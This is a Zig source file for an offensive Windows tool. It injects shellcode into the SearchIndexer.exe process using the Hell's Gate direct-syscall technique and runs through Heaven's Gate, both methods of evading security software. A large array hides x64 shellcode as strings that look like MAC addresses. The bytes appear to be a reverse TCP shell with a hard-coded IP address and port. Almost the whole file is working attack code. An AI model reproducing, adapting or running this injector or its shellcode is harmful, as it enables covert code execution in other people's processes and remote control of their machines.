const std = @import("std");
const hell = @import("hell.zig");
const heaven = @import("heaven.zig");
const payloads = @import("payloads.zig");
const net = std.net;
const win = std.os.windows;

const DWORD = win.DWORD;
const BOOL = win.BOOL;
const WINAPI = win.WINAPI;
const HANDLE = win.HANDLE;
const FALSE = win.FALSE;
const TH32CS_SNAPPROCESS: DWORD = 0x00000002;
const INVALID_HANDLE_VALUE: HANDLE = @as(HANDLE, @ptrFromInt(@as(usize, @bitCast(@as(isize, -1)))));
const MAX_PATH: usize = 260;

// PROCESSENTRY32W structure
const PROCESSENTRY32W = extern struct {
    dwSize: DWORD,
    cntUsage: DWORD,
    th32ProcessID: DWORD,
    th32DefaultHeapID: usize, // ULONG_PTR
    th32ModuleID: DWORD,
    cntThreads: DWORD,
    th32ParentProcessID: DWORD,
    pcPriClassBase: i32, // LONG
    dwFlags: DWORD,
    szExeFile: [MAX_PATH]u16, // WCHAR[MAX_PATH]
};

const MAC_ARRAY: [85][]const u8 = [_][]const u8{ "fc:48:83:e4:f0:e8", "cc:00:00:00:41:51", "41:50:52:48:31:d2", "51:56:65:48:8b:52", "60:48:8b:52:18:48", "8b:52:20:48:0f:b7", "4a:4a:4d:31:c9:48", "8b:72:50:48:31:c0", "ac:3c:61:7c:02:2c", "20:41:c1:c9:0d:41", "01:c1:e2:ed:52:41", "51:48:8b:52:20:8b", "42:3c:48:01:d0:66", "81:78:18:0b:02:0f", "85:72:00:00:00:8b", "80:88:00:00:00:48", "85:c0:74:67:48:01", "d0:8b:48:18:44:8b", "40:20:50:49:01:d0", "e3:56:4d:31:c9:48", "ff:c9:41:8b:34:88", "48:01:d6:48:31:c0", "41:c1:c9:0d:ac:41", "01:c1:38:e0:75:f1", "4c:03:4c:24:08:45", "39:d1:75:d8:58:44", "8b:40:24:49:01:d0", "66:41:8b:0c:48:44", "8b:40:1c:49:01:d0", "41:8b:04:88:48:01", "d0:41:58:41:58:5e", "59:5a:41:58:41:59", "41:5a:48:83:ec:20", "41:52:ff:e0:58:41", "59:5a:48:8b:12:e9", "4b:ff:ff:ff:5d:49", "be:77:73:32:5f:33", "32:00:00:41:56:49", "89:e6:48:81:ec:a0", "01:00:00:49:89:e5", "49:bc:02:00:05:39", "64:56:41:1d:41:54", "49:89:e4:4c:89:f1", "41:ba:4c:77:26:07", "ff:d5:4c:89:ea:68", "01:01:00:00:59:41", "ba:29:80:6b:00:ff", "d5:6a:0a:41:5e:50", "50:4d:31:c9:4d:31", "c0:48:ff:c0:48:89", "c2:48:ff:c0:48:89", "c1:41:ba:ea:0f:df", "e0:ff:d5:48:89:c7", "6a:10:41:58:4c:89", "e2:48:89:f9:41:ba", "99:a5:74:61:ff:d5", "85:c0:74:0a:49:ff", "ce:75:e5:e8:93:00", "00:00:48:83:ec:10", "48:89:e2:4d:31:c9", "6a:04:41:58:48:89", "f9:41:ba:02:d9:c8", "5f:ff:d5:83:f8:00", "7e:55:48:83:c4:20", "5e:89:f6:6a:40:41", "59:68:00:10:00:00", "41:58:48:89:f2:48", "31:c9:41:ba:58:a4", "53:e5:ff:d5:48:89", "c3:49:89:c7:4d:31", "c9:49:89:f0:48:89", "da:48:89:f9:41:ba", "02:d9:c8:5f:ff:d5", "83:f8:00:7d:28:58", "41:57:59:68:00:40", "00:00:41:58:6a:00", "5a:41:ba:0b:2f:0f", "30:ff:d5:57:59:41", "ba:75:6e:4d:61:ff", "d5:49:ff:ce:e9:3c", "ff:ff:ff:48:01:c3", "48:29:c6:48:85:f6", "75:b4:41:ff:e7:58", "6a:00:59:49:c7:c2", "f0:b5:a2:56:ff:d5" };
const NUMBER_OF_ELEMENTS: usize = 85;

const target_process_name = "SearchIndexer.exe";

extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) ?HANDLE;
extern "kernel32" fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) callconv(WINAPI) HANDLE;
extern "kernel32" fn Process32FirstW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;
extern "kernel32" fn Process32NextW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;
extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
extern "kernel32" fn GetLastError() callconv(WINAPI) DWORD;

// Helper function to convert UTF-8 string to UTF-16 (wide string)
fn convertToWideString(allocator: std.mem.Allocator, utf8_str: []const u8) ![]u16 {
    const utf16_len = try std.unicode.calcUtf16LeLen(utf8_str);
    var wide_string = try allocator.alloc(u16, utf16_len + 1);

    _ = try std.unicode.utf8ToUtf16Le(wide_string[0..utf16_len], utf8_str);
    wide_string[utf16_len] = 0; // Null terminate

    return wide_string;
}

// Helper function to compare wide strings (case-insensitive)
fn compareWideStringsIgnoreCase(str1: []const u16, str2: []const u16) bool {
    if (str1.len != str2.len) return false;

    for (str1, str2) |c1, c2| {
        // Simple case-insensitive comparison for ASCII range
        const lower_c1 = if (c1 >= 'A' and c1 <= 'Z') c1 + 32 else c1;
        const lower_c2 = if (c2 >= 'A' and c2 <= 'Z') c2 + 32 else c2;
        if (lower_c1 != lower_c2) return false;
    }
    return true;
}

fn getRemoteProcessPid(allocator: std.mem.Allocator, process_name: []const u8) !DWORD {
    const wide_process_name = try convertToWideString(allocator, process_name);
    defer allocator.free(wide_process_name);

    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return error.SnapshotFailed;
    }
    defer _ = CloseHandle(snapshot);

    var process_entry = std.mem.zeroes(PROCESSENTRY32W);
    process_entry.dwSize = @sizeOf(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &process_entry) == 0) {
        return error.ProcessEnumFailed;
    }

    while (true) {
        // Find the length of the executable name (null-terminated)
        var exe_name_len: usize = 0;
        while (exe_name_len < process_entry.szExeFile.len and process_entry.szExeFile[exe_name_len] != 0) {
            exe_name_len += 1;
        }

        const exe_name = process_entry.szExeFile[0..exe_name_len];

        // Compare process names (case-insensitive)
        if (compareWideStringsIgnoreCase(exe_name, wide_process_name[0 .. wide_process_name.len - 1])) { // -1 to exclude null terminator
            return process_entry.th32ProcessID;
        }

        if (Process32NextW(snapshot, &process_entry) == 0) {
            break;
        }
    }

    return error.ProcessNotFound;
}

fn runX64ShellcodeByHellsGate() !void {
    // -----------------------------------------
    // Init shellcode
    // -----------------------------------------
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shellcode = try payloads.macDeobfuscation(&payloads.msgbox, allocator);

    var hell_success = false;

    // -----------------------------------------
    // Init vx_table for Hell's Gate
    // -----------------------------------------
    // Fix: Handle the optional return type properly
    var vx_table = hell.init_vx_table() orelse {
        std.debug.print("[-] Failed to initialize Hell's Gate VX table\n", .{});
        return;
    };

    // -----------------------------------------
    // Get the target process ID
    // -----------------------------------------
    const target_pid = getRemoteProcessPid(allocator, target_process_name) catch |err| {
        switch (err) {
            error.ProcessNotFound => {
                std.debug.print("[-] Target process '{s}' not found\n", .{target_process_name});
                return;
            },
            else => return err,
        }
    };

    // -----------------------------------------
    // Get the target process handle
    // -----------------------------------------
    const target_process_handle = OpenProcess(hell.PROCESS_ALL_ACCESS, FALSE, target_pid) orelse {
        std.debug.print("[-] Failed to open target process\n", .{});
        return;
    };
    defer _ = CloseHandle(target_process_handle);

    // -----------------------------------------
    // Inject the shellcode by Hell's Gate
    // -----------------------------------------
    hell_success = hell.hellsGateInject(&vx_table, target_process_handle, shellcode.ptr, shellcode.len);

    std.debug.print("[*] Hell's Gate injection result: {}\n", .{hell_success});
}

pub fn main() !void {
    // Check if Heaven's Gate conditions are met
    if (!heaven.is_available()) {
        std.process.exit(1);
    }

    // Fix: Properly cast function pointer without discarding const
    const func_addr: ?*anyopaque = @ptrCast(@constCast(&runX64ShellcodeByHellsGate));

    // No arguments needed for this function
    const argc: c_int = 0;
    var argv: [1]u64 = [_]u64{0}; // Dummy array since argc is 0
    var ret_val: u64 = 0;

    // Execute Heaven's Gate technique to run the function in 64-bit mode
    // const result = heaven.injectFunction(func_addr, argc, &argv, &ret_val);
    _ = heaven.injectFunction(func_addr, argc, &argv, &ret_val);

    // if (result != 0) {
    //     std.debug.print("[+] Successfully executed function via Heaven's Gate\n", .{});
    //     std.debug.print("[*] Return value: 0x{X}\n", .{ret_val});
    // } else {
    //     std.debug.print("[-] Failed to execute function via Heaven's Gate\n", .{});
    //     std.process.exit(1);
    // }
}
